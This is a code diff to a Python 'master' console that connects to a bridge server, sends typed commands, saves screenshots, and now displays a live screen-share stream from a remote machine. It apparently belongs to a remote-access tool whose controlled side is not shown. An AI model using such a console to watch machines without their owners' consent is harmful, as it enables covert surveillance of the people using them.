@@ -3,10 +3,13 @@ import pickle
 import struct
 import time
 import soundfile as sf
+import cv2
+from threading import Thread
 
+screenshare = False
 
 bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-bridge.connect(("192.168.1.36", 9999))
+bridge.connect(("localhost", 9999))
 
 bridge.send(b"master")
 
@@ -35,12 +38,29 @@ def send(data, cli):
     size = len(data)
     cli.sendall(struct.pack(">L", size) + data)
 
+def screensharing():
+    pass
+
 
 while True:
     command = input("cmd>")
     send(command, bridge)
+    if command == "screenshare":
+        screenshare = True
+        while screenshare:
+            try:
+                data = receive(bridge)
+                if len(data.tobytes()) != 0:
+                    frame = cv2.imdecode(data, cv2.IMREAD_COLOR)
+                    cv2.imshow("frame", frame)
+                    if cv2.waitKey(1) == ord('q'):
+                        break
+                send(command, bridge)
+            except:
+                pass
+        cv2.destroyAllWindows()
 
-    if command == "screenshot":
+    elif command == "screenshot":
         with open(f"screenshot{time.time()}.jpg", "wb") as f:
             f.write(receive(bridge).tobytes())
 
